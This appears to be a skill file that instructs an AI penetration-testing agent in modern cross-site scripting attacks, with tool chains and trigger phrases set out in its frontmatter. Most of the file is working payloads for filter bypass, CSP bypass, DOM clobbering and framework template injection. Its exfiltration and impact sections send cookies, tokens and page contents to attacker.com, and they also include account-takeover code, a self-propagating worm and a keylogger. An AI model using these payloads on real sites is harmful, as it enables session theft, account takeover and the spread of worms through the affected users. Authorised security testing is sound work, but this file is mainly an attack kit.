---
name: modern-xss
description: "Modern XSS exploitation with polyglot payloads, CSP bypass, DOM clobbering, and framework-specific techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, getDialogEvidence, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["modern xss", "polyglot xss", "csp bypass xss", "dom clobbering", "xss exploitation", "client side attack", "javascript injection", "cross site scripting advanced", "dom xss", "stored xss impact"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1059.007"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP XSS"]
toolChains:
  - name: xss-reflected
    description: "Test for reflected XSS via response-based payloads"
    steps: [httpRequest, parseResponse, evaluateRendered, getDialogEvidence, recordEvidence, writeFinding]
  - name: xss-dom-based
    description: "Test for DOM-based XSS via client-side execution"
    steps: [httpRequest, parseResponse, evaluateRendered, detectReactions, getDialogEvidence, writeFinding]
compositionRules:
  enhances: [web-pentest, business-logic]
---

# Modern XSS Exploitation

## When to Use

- Target accepts user input that is reflected in HTML, JS, attributes, or URLs
- DOM-based sinks identified (`innerHTML`, `eval`, `document.write`, `location.*`)
- CSP headers present but bypassable
- Framework rendering pipelines (React, Angular, Vue, Svelte) with dangerous patterns
- Stored XSS vectors in comments, profiles, messages, settings fields
- Mutation XSS via parser differentials (`<noscript>`, `<template>`)

## Do Not Use

- Target output-encodes all contexts consistently (verified via render test)
- CSP `script-src` with strict nonce-based enforcement and no bypass vectors
- No user-controlled input reaches any sink or reflection point
- Target uses `HttpOnly` cookies exclusively and no sensitive JS-accessible data exists
- Target has no authenticated state worth exfiltrating

## Auth Context

When auth is available (`contextBoosts: [auth]`):
- Authenticated XSS yields session token theft, account takeover, and privilege escalation
- Test both authenticated and unauthenticated reflection points — filters often differ
- Authenticated stored XSS in profile fields affects all users who view the profile
- Authenticated DOM XSS can bypass CSRF protections by extracting tokens from the DOM
- Compare response behavior: some WAFs relax inspection for authenticated sessions

---

## Polyglot Payloads

Payloads designed to fire across multiple injection contexts simultaneously.

### Universal Polyglots

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```
Fires in href, event handler, and JS string contexts.

```
";/*</title></style></textarea></noscript></xmp><svg/onload=alert(1)>//
```
Closes HTML tag contexts, breaks out of title/style/textarea/noscript, injects SVG.

```
'">><marquee onstart=alert(1)>
```
Generic context-breaker for attribute injection.

```
"><img src=x onerror=alert(1)>
```
Breaks out of any attribute-quoted context.

```
'-'-alert(1)-'-'
```
Inside JS numeric or string arithmetic contexts.

### Advanced Polyglots

```
javascript:/*`/*'/*"/*/(/*oNcLiCk*=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```
Multi-context payload using URL encoding and parser differential.

```
</script><svg onload=alert(1)>
```
If injected inside a `<script>` block — breaks script context, triggers via SVG.

```
{{constructor.constructor('alert(1)')()}}
```
Template injection polyglot for Angular, Vue, Svelte template contexts.

---

## Context-Specific Bypass

### HTML Body Context

Injection directly into `<body>` content.

```
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

**Filter Bypass:**
- Case variation: `<sVg oNlOaD=alert(1)>`
- Null bytes: `<s%00vg onload=alert(1)>`
- Whitespace variants: `<svg\t onload=alert(1)>`
- Double-encoding: `%253csvg%2520onload%253dalert(1)%253e`

### Attribute Context

Injection inside an HTML attribute value.

```
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
' onfocus=alert(1) autofocus='
" style="background:url(javascript:alert(1))
" onclick=alert(1) "
```

**Filter Bypass:**
- Tab/newline between event handler and `=`: `" onfocus	=alert(1)`
- Mixed encoding: `" onfocus=&#97;lert(1)`
- Backtick instead of quotes: `` " onfocus=alert(1) ``

### JavaScript String Context

Injection inside a JS string literal.

```
';alert(1);//
"-alert(1)-"
`-alert(1)-`
</script><script>alert(1)</script>
```

**Filter Bypass:**
- Unicode escapes: `\u0027;alert(1);`
- Hex escapes: `\x27;alert(1);`
- Template literal breakout: `` `);alert(1);// ``
- Line continuation: `\` followed by newline to break string

### URL Context

Injection inside `href`, `src`, or `action` attributes.

```
javascript:alert(1)
javascript:alert%281%29
javascript:void`alert(1)`
javascript:/*-/*`/*\`/*'/*"/**/(/* */alert(1))//
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**Filter Bypass:**
- Tab/newline after `javascript:`: `javascript%0a:alert(1)`
- Mixed case: `jAvAsCrIpT:alert(1)`
- Data URI with whitespace: `data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
- `\t` and `\n` inside protocol: `java\tscript:alert(1)`

### Template Literal Context

Injection inside ES6 template literals.

```
${alert(1)}
`-alert(1)-`
${document.cookie}
${fetch('//evil.com/?c='+document.cookie)}
```

---

## CSP Bypass Techniques

### unsafe-inline Present

If `script-src` includes `unsafe-inline`, standard inline scripts execute. No bypass needed.

### unsafe-eval Present

If `unsafe-eval` is present:
```
eval(atob('YWxlcnQoMSk='))
new Function('alert(1)')()
setTimeout('alert(1)')
setInterval('alert(1)',1000)
```

### Base URI Injection

If `base-uri` is not restricted:
```html
<base href="https://attacker.com/">
```
All relative script `src` paths now resolve to attacker-controlled URLs. Combine with a script file on the attacker domain.

### JSONP Endpoint Abuse

Many CDN-hosted libraries expose JSONP callbacks:
```
https://cdn.example.com/libraries/jquery/3.6.0/jquery.min.js?callback=alert
```
If the domain is allowlisted in CSP, load the JSONP endpoint as a script:
```html
<script src="https://cdn.example.com/libraries/jquery/3.6.0/jquery.min.js?callback=alert"></script>
```

### CDN Script Injection

Check if `script-src` allowlists CDNs with open redirect or content control:
- `cdnjs.cloudflare.com` — extensive library hosting
- `unpkg.com` — npm package hosting
- `jsdelivr.net` — npm/GitHub hosting
- `ajax.googleapis.com` — Google-hosted libraries

If an attacker can publish a package or control a repo, they can inject code into an allowlisted CDN path.

### path: Directive Bypass

If CSP uses `path:` in `script-src`:
```
script-src 'self' https://cdn.example.com/app/
```
Bypass by injecting a script at a path under the allowed directory:
- If upload endpoint stores files under `/app/uploads/`, upload a `.js` file there
- If the app has a route that reflects content as `text/javascript`, use that route

### strict-dynamic Abuse

If `script-src` includes `strict-dynamic`:
```
<script src="https://trusted.com/lib.js"></script>
<script>
  // Any script created by a trusted script is also trusted
  var s = document.createElement('script');
  s.src = 'https://attacker.com/evil.js';
  document.body.appendChild(s);
</script>
```
Find a DOM XSS or mutation that creates script elements via a trusted script.

### nonce Reuse

If CSP uses nonces but the nonce is leaked or reusable:
- Check if nonce appears in a reflected parameter
- Check if nonce is static across requests (not rotated)
- Reuse the leaked nonce in an injected `<script nonce="LEAKED_NONCE">` tag

### Report-Only Bypass

If CSP is `Content-Security-Policy-Report-Only`, it does not enforce. All bypass techniques apply — the policy only logs violations.

---

## DOM Clobbering

Overwrite DOM properties to influence JavaScript execution.

### Basic Clobbering

```html
<a id=owner><a id=owner name=owner>
```
If JS does `document.owner`, it returns the `<a>` element instead of `document`.

### Prototype Pollution Chain

```html
<a id=prototype><a id=prototype name=prototype>
```
Combined with code that reads `config[someKey]`, clobbered elements become truthy values.

### document.domain Override

```html
<form id=document><input name=domain value=evil.com></form>
```
If JS reads `document.domain`, it gets the attacker-controlled value.

### Constructor Clobbering

```html
<img id=x onerror="Object.defineProperty(window,'config',{value:{src:'https://evil.com/payload.js'}})">
```
Or via named elements:
```html
<iframe name=constructor src="javascript:alert(1)">
```

### URL Parser Clobbering

```html
<a id=url href="//evil.com">
```
If JS reads `element.href` or parses `document.getElementById('url').href`, it resolves to the attacker's domain.

### Practical Clobbering Chain

```html
<div id=el></div>
<a id=el name=innerHTML>
<script>
  // el.innerHTML is now the <a> element, not the property
  // If code does el.innerHTML = userInput, the clobbered property may interfere
</script>
```

---

## Framework-Specific XSS

### React

**dangerouslySetInnerHTML:**
```jsx
<div dangerouslySetInnerHTML={{__html: userInput}} />
```
- Direct HTML injection if user input is not sanitized
- Payload: `<img src=x onerror=alert(document.cookie)>`
- Bypass React's JSX escaping — JSX escapes `{userInput}` but not `dangerouslySetInnerHTML`

**React URL handlers:**
```jsx
<a href={userProvidedUrl}>Link</a>
```
- React allows `javascript:` URLs in `href`
- Payload: `javascript:alert(1)`
- React 16.x+ warns but does not block in all cases
- Test both `<a href>` and `<iframe src>` patterns

**React state mutation:**
- If React state is serialized to DOM (e.g., `data-*` attributes), inject payloads into state values that become attributes

### Angular

**Template injection:**
```
{{7*7}}  → 49
{{constructor.constructor('alert(1)')()}}
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('alert(1)');}}
```

**Angular bypasses:**
- `bypassSecurityTrustHtml()` — disables sanitizer for specific values
- `[innerHTML]` binding with unsanitized input
- `DomSanitizer.bypassSecurityTrustScript()` for script context
- `routerLink` with attacker-controlled navigation targets

**Angular-specific payloads:**
```
{{toString().constructor.prototype.charAt=[].join;$eval('alert(1)');}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

### Vue

**v-html directive:**
```html
<div v-html="userInput"></div>
```
- Direct HTML injection, equivalent to `innerHTML`
- Payload: `<img src=x onerror=alert(1)>`

**Vue template injection:**
```
{{7*7}}
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
```

**Vue event handler injection:**
```
v-on:click=alert(1)
@click=alert(1)
```
If user input is placed in Vue template directives.

### Svelte

**{#html} / {@html} tag:**
```svelte
{@html userInput}
```
- Direct HTML injection
- No built-in sanitization
- Payload: `<img src=x onerror=alert(1)>`

**Svelte reactive statements:**
```
$:{alert(1)}
```
If user input reaches reactive declarations.

---

## Mutation XSS (mXSS)

Exploits parser differentials between browser sanitizers and actual rendering.

### noscript Escaping

```html
<noscript><img src=x onerror=alert(1)></noscript>
```
When `noscript` content is parsed by a sanitizer that treats it as raw text, but the browser renders it when JS is enabled.

### textarea/title Injection

```html
<textarea><img src=x onerror=alert(1)></textarea>
<title><img src=x onerror=alert(1)></title>
```
Sanitizers may not parse inside raw text elements, but browser mutation can break out.

### DOMParser mXSS

```js
var doc = new DOMParser().parseFromString('<div><img src=x onerror=alert(1)>', 'text/html');
document.body.appendChild(doc.body.firstChild);
```
DOMParser may interpret content differently than the live DOM, enabling bypasses.

### Template Element mXSS

```html
<template><img src=x onerror=alert(1)></template>
```
Content inside `<template>` is not rendered until the element is cloned and appended to the DOM.

### SVG ForeignObject

```html
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
```
SVG namespace parsing differs from HTML, bypassing some sanitizers.

---

## Exfiltration Techniques

### OOB Data Theft

```js
// Basic cookie exfiltration
fetch('https://attacker.com/steal?c='+document.cookie)

// Via image pixel
new Image().src='https://attacker.com/steal?c='+document.cookie

// Via script injection
var s=document.createElement('script');
s.src='https://attacker.com/steal.js?d='+btoa(document.cookie);
document.body.appendChild(s);

// Via WebSocket
var ws=new WebSocket('wss://attacker.com/exfil');
ws.onopen=function(){ws.send(document.cookie)};
```

### CSS Exfiltration

```css
input[value^="a"] { background-image: url(https://attacker.com/a); }
input[value^="b"] { background-image: url(https://attacker.com/b); }
```
Brute-force character-by-character extraction of input values.

**Modern CSS exfiltration:**
```css
@import url('https://attacker.com/leak?data=' attr(data-secret));
```

### WebSocket Exfiltration

```js
var ws=new WebSocket('wss://attacker.com/exfil');
ws.onopen=function(){
  ws.send(JSON.stringify({
    cookies:document.cookie,
    tokens:localStorage.getItem('token'),
    html:document.documentElement.outerHTML
  }));
};
```

### Fetch API Exfiltration

```js
fetch('https://attacker.com/exfil',{
  method:'POST',
  body:JSON.stringify({
    cookies:document.cookie,
    url:location.href,
    dom:document.body.innerHTML.substring(0,5000)
  }),
  headers:{'Content-Type':'application/json'}
});
```

### DNS Exfiltration

```js
// Encode data in DNS queries
var data=btoa(document.cookie);
new Image().src='https://'+data+'.attacker.com/track';
```
Data appears in DNS server logs. Useful when HTTP exfiltration is blocked.

---

## Impact Demonstration

### Session Hijacking

```js
fetch('https://attacker.com/steal?session='+document.cookie)
// or
new Image().src='https://attacker.com/steal?session='+localStorage.getItem('sessionId')
```
Stolen session token allows attacker to impersonate the victim.

### Account Takeover

```js
// Change victim's email
fetch('/api/account/email',{
  method:'POST',
  body:JSON.stringify({email:'attacker@evil.com'}),
  headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken}
});
```
Combine session theft with account modification for permanent takeover.

### Phishing Overlay

```js
var iframe=document.createElement('iframe');
iframe.src=location.href;
iframe.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0.01';
document.body.appendChild(iframe);
// Captures keystrokes from the invisible iframe
```

### Worm Payload

```js
// Self-propagating XSS worm
// Stored in a field that other users view
var worm='<script>fetch("/api/post",{method:"POST",body:JSON.stringify({content:document.body.innerHTML.substring(0,2000)}),headers:{"Content-Type":"application/json"}})</script>';
// Every user who views the infected post triggers the payload
// Which posts the content to their own profile
// Which infects their followers, and so on
```

### Keylogger

```js
document.onkeypress=function(e){
  fetch('https://attacker.com/log?key='+e.key+'&page='+location.href);
};
```

---

## Anti-Hallucination

- Every payload MUST be tested via `evaluateRendered` or `getDialogEvidence` before claiming it fires
- Do NOT claim a CSP is bypassable without verifying the `Content-Security-Policy` header via `httpRequest`
- Do NOT claim DOM clobbering works without confirming the target JS reads the clobbered property
- Do NOT claim framework injection works without verifying the framework version and template syntax
- Do NOT assume a sanitizer is bypassable — test with actual payloads and verify via render
- Record every evidence artifact: HTTP responses, rendered DOM snapshots, dialog confirmations
- If a payload does not fire, report the specific failure mode (blocked by CSP, output-encoded, not reflected, etc.)
